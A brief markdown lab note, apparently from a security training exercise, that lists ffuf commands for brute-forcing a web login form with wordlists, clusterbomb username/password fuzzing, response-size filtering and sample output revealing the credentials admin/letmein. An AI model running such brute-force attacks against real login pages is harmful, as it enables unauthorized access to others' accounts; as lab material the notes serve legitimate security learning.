
# Commands Used in Lab 3 🛠️

## Basic FFUF Command
```bash
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814
```

## Clusterbomb Mode for Username/Password Fuzzing
1. **Modify the Request File:**
   - Replace username and password fields with placeholders `USER` and `PASS`:
     ```
     username=USER&password=PASS
     ```

2. **Create a Custom Password List:**
   - Save a `passwordl3.txt` file with the following passwords:
     ```
     letmein
     password123
     admin2023
     test123
     ```

3. **Run Clusterbomb Mode:**
   ```bash
   ffuf -request l3request.txt -request-proto http -mode clusterbomb    -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER    -w ./passwordl3.txt:PASS
   ```

4. **Filter Responses by Size:**
   - Focus on unusual response sizes (e.g., `3378`):
     ```bash
     ffuf -request l3request.txt -request-proto http -mode clusterbomb      -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER      -w ./passwordl3.txt:PASS -fs 3256
     ```

---

## Example Output
```plaintext
[Status: 200, Size: 3378, Words: 1270, Lines: 68, Duration: 24ms]
  * USER: admin
  * PASS: letmein
```
